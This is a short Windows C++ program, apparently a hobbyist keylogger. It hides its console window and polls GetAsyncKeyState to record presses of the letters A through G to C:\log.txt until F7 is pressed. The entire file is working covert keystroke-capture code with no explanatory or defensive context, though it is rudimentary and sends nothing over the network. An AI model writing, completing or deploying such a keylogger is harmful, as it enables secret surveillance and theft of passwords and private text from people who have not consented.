#include "iostream"
#include "fstream"
#include "Windows.h"



using namespace std;
int main(void)
{
	bool pulsar = true;
	fstream keylog("C:\\log.txt", fstream::out);
	HWND sigilo;
	AllocConsole();
	sigilo = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(sigilo, 0);
	while (pulsar)
	{
		Sleep(10);
		if (GetAsyncKeyState('A') == -32767)
		{
			keylog << "A";
		}
		if (GetAsyncKeyState('B') == -32767)
		{
			keylog << "B";
		}
		if (GetAsyncKeyState('C') == -32767)
		{
			keylog << "C";
		}
		if (GetAsyncKeyState('D') == -32767)
		{
			keylog << "D";
		}
		if (GetAsyncKeyState('E') == -32767)
		{
			keylog << "E";
		}
		if (GetAsyncKeyState('F') == -32767)
		{
			keylog << "F";
		}
		if (GetAsyncKeyState('G') == -32767)
		{
			keylog << "G";
		}
		
		if (GetAsyncKeyState(VK_F7) == -32767)
		{
			ShowWindow(sigilo, 1);
			pulsar = false;
			keylog.close();
		}
	}
	system("pause");
}